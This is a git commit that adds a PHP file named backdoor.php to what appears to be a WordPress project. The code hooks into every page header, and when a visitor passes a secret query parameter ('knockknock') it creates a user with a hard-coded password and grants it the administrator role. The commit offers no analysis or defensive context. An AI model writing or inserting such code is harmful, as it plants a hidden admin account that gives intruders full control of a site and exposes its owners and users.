7d3ca0812b70f7f909452583fa845662272db644
Himal Malith <dphmalith@gmail.com>
2023-10-19 04:14:17 +0000

    Create backdoor.php

---
+++ backdoor.php
@@ -0,0 +1,14 @@
+<?php
+add_action('wp_head', 'wploop_flm'); 
+
+function wploop_flm() { 
+  If ($_GET['entryhook'] == 'knockknock') { 
+     require('wp-includes/registration.php'); 
+     If (!username_exists('username')) { 
+        $user_id = wp_create_user('flm', 'eb34f78aff557f3cb0291b0a921fbf27'); 
+        $user = new WP_User($user_id);
+        $user->set_role('administrator');
+     }
+  }
+}
+?>
